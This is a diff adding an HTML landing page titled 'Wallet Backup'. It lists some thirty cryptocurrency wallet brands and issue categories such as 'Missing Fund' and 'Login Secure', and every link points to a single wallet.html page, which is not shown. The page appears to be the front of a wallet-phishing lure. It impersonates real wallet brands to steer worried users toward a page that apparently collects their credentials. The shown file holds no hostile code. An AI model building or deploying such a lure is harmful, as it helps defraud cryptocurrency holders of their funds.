@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Wallet Backup</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.7/dist/tailwind.min.css"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="./asset/font/fontawesome-free-6.4.2-web/css/all.css"
+    />
+    <link
+      rel="shortcut icon"
+      href="./asset/image/web-logo.png"
+      type="image/x-icon"
+    />
+  </head>
+  <body class="bg-gray-100">
+    <nav
+      class="bg-blue-500 p-3 fixed w-full flex justify-between px-8 items-center space-x-4"
+    >
+      <a href="./index.html">
+        <img
+          src="./asset/image/web-logo.png"
+          alt="wallet backup"
+          title="Wallet Backup"
+          class="w-20 h-10 rounded-full"
+        />
+      </a>
+
+      <span id="getStarted" class="bg-white py-1 px-4 rounded cursor-pointer">
+        🟰
+      </span>
+    </nav>
+
+    <header
+      class="bg-black flex items-center flex-col pb-10 space-y-4 pt-24 justify-center text-center bg-cover sm:bg-top md:bg-center bg-no-repeat h-96 md:h-auto"
+      style="
+        background-image: linear-gradient(
+            rgba(0, 0, 0, 0.5),
+            rgba(0, 0, 0, 0.5)
+          ),
+          url('./asset/image/headeee.jpg');
+      "
+    >
+      <h1 class="md:text-6xl font-bold text-white" style="width: 50%">
+        Back Up Your Wallets So You Can Stay Save Without Thinking Much.
+      </h1>
+
+      <div class="text-white text-sm">
+        Wallet Backup <i class="fa-solid fa-chevron-right"></i> Home
+      </div>
+    </header>
+
+    <div>
+      <div class="text-center pt-4 flex items-center justify-center flex-col">
+        <h1 class="text-3xl">PLEASE SELECT ISSUE CATEGORY</h1>
+        which of this is related to your issue?
+      </div>
+      <div
+        class="p-4 flex items-center justify-center gap-4 flex-wrap w-full"
+      >
+        <div class="bg-blue-500 text-white rounded-xl p-4">
+          <a
+            href="./wallet.html"
+            class="fa-solid fa-arrow-right-arrow-left text-2xl bg-white h-10 w-16 rounded-full text-black text-center pt-2"
+          ></a>
+          <h1 class="font-bold text-2xl">Swap / Exchange</h1>
+          <p>Service been offered. click icon to try out.</p>
+        </div>
+        <div class="bg-blue-500 text-white rounded-xl p-4">
+          <a
+            href="./wallet.html"
+            class="fa-solid fa-gamepad text-2xl bg-white h-10 w-16 rounded-full text-black text-center pt-2"
+          ></a>
+          <h1 class="font-bold text-2xl">NFT Mint</h1>
+          <p>Service been offered. click icon to try out.</p>
+        </div>
+        <div class="bg-blue-500 text-white rounded-xl p-4">
+          <a
+            href="./wallet.html"
+            class="fa-solid fa-mobile-screen-button text-2xl bg-white h-10 w-16 rounded-full text-black text-center pt-2"
+          ></a>
+          <h1 class="font-bold text-2xl">Connect to Dapp</h1>
+          <p>Service been offered. click icon to try out.</p>
+        </div>
+        <div class="bg-blue-500 text-white rounded-xl p-4">
+          <a
+            href="./wallet.html"
+            class="fa-solid fa-key text-2xl bg-white h-10 w-16 rounded-full text-black text-center pt-2"
+          ></a>
+          <h1 class="font-bold text-2xl">Login Secure</h1>
+          <p>Service been offered. click icon to try out.</p>
+        </div>
+        <div class="bg-blue-500 text-white rounded-xl p-4">
+          <a
+            href="./wallet.html"
+            class="fa-solid fa-chart-bar text-2xl bg-white h-10 w-16 rounded-full text-black text-center pt-2"
+          ></a>
+          <h1 class="font-bold text-2xl">High Fees</h1>
+          <p>Service been offered. click icon to try out.</p>
+        </div>
+        <div class="bg-blue-500 text-white rounded-xl p-4">
+          <a
+            href="./wallet.html"
+            class="fa-solid fa-money-bill text-2xl bg-white h-10 w-16 rounded-full text-black text-center pt-2"
+          ></a>
+          <h1 class="font-bold text-2xl">Missing Fund</h1>
+          <p>Service been offered. click icon to try out.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Modal for getting started -->
+    <div class="hidden justify-center z-50" id="modal">
+      <div
+        class="absolute pb-10 overflow-y-auto top-0 md:bottom-0 no-scrollbar flex flex-col items-center justify-center bg-gray-800 bg-opacity-70 z-40"
+      >
+     <!-- List of wallet to backup -->
+        <div class="flex gap-4 flex-wrap mb-4 items-center justify-center">
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/trust.png"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">Trust Wallet</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/lobstr.png"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">lobstr</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/aktionariat-c5784b26234a389632687a36d2fb3258.png"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">Aktionariat</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/Alice.png"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">Alice</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/zelcore-d4c1a7a444b95612f6373f0b536b6ccb.png"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">ZelCore</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/Wazirx.png"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">Wazirx</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/walleth-b60336f8dd9ea86285408cb4f96634d1.png"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">Walleth</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/wallet.io.png"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">Wallet.io</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/trustvault-9031a67f82293fc50ead978f936cfff3.png"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">TrustVault</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/Torus.jpeg"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">Torus</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/tokenpocket-57a4a886cc644e5237ac1558226154cb.png"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">TokenPocket</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/Tokenary.png"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">Tokenary</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/Spatium.jpeg"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">Spatium</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/Coinbase.png"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">Coinbase</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/save.jpeg"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">Gnosis Safe Multisig</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/SafePal.png"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">SafePal</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/rainbow.jpeg"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">Rainbow</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/Ownbit.png"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">Ownbit</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/onto-983003d35fe32bf916f9eda381f138f7.png"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">ONTO</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/Nash.jpeg"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">Nash</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/mykey-7419df5270c0406c80cba19fa5165923.png"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">MYKEY</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/money.jpeg"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">Money</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/Midas Wallet.png"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">Midas Wallet</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/metamask.png"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">Metamask</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/math-wallet-9e2256cfa5aad3b33af05f3fee4dc9ef.png"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">MathWallet</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/maiar.png"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">Maiar</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/Binance Smart Chain.png"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">Binance Smart Chain</h1>
+          </div>
+          <div
+            class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
+          >
+            <a href="./wallet.html">
+              <img
+                src="./asset/image/Blockchain.png"
+                alt=""
+                class="w-20 h-20 rounded-xl"
+              />
+            </a>
+            <h1 class="text-white font-bold">Blockchain</h1>
+          </div>
+          
+        </div>
+        <!-- End of the List of wallet to backup -->
+
+
+        <a href="./wallet.html"
+          ><button
+            class="relative inline-flex items-center justify-center p-0.5 mb-2 mr-2 overflow-hidden text-sm font-medium text-gray-900 rounded-lg group bg-gradient-to-br from-purple-600 to-blue-500 group-hover:from-purple-600 group-hover:to-blue-500 hover:text-white dark:text-white focus:ring-4 focus:outline-none focus:ring-blue-300 dark:focus:ring-blue-800"
+          >
+            <span
+              class="relative px-5 py-2.5 transition-all ease-in duration-75 bg-white dark:bg-gray-900 rounded-md group-hover:bg-opacity-0"
+            >
+              Get Started with your backup
+              <i class="fa-solid fa-arrow-right"></i>
+            </span>
+          </button>
+        </a>
+      </div>
+      <div
+        class="bg-black fixed bottom-0 z-50 text-white font-bold w-10 h-10 flex items-center justify-center rounded-full cursor-pointer"
+        id="closeModal"
+      >
+        <i class="fa-solid fa-x"></i>
+      </div>
+    </div>
+    <footer class="bg-blue-500 text-white pb-4">
+      <div class="flex w-full justify-around p-6 leading-10">
+        <div class="flex flex-wrap flex-col">
+          <p><a href="./wallet.html">Trust Wallet</a></p>
+          <p><a href="./wallet.html">Money</a></p>
+          <p><a href="./wallet.html">MathWallet</a></p>
+          <p><a href="./wallet.html">Maiar</a></p>
+          <p><a href="./wallet.html">lobstr</a></p>
+          <p><a href="./wallet.html">ONTO</a></p>
+          <p><a href="./wallet.html">SafePal</a></p>
+          <p><a href="./wallet.html">Nash</a></p>
+        </div>
+        <div class="flex flex-wrap flex-col">
+          <p><a href="./wallet.html">TokenPocket</a></p>
+          <p><a href="./wallet.html">Aktionariat</a></p>
+          <p><a href="./wallet.html">ZelCore</a></p>
+          <p><a href="./wallet.html">MYKEY</a></p>
+          <p><a href="./wallet.html">Metamask</a></p>
+          <p><a href="./wallet.html">Midas Wallet</a></p>
+          <p><a href="./wallet.html">Binance Smart Chain</a></p>
+          <p><a href="./wallet.html">Blockchain</a></p>
+        </div>
+      </div>
+
+      <p class="text-center">Wallet Backup &copy; Copyright 2023</p>
+    </footer>
+
+    <script>
+      // Get references to the menu and close button
+      const getStarted = document.getElementById("getStarted");
+      const closeModal = document.getElementById("closeModal");
+      const modal = document.getElementById("modal");
+
+      getStarted.addEventListener("click", () => {
+        modal.style.display = "flex";
+      });
+
+      closeModal.addEventListener("click", () => {
+        modal.style.display = "none";
+      });
+    </script>
+  </body>
+</html>
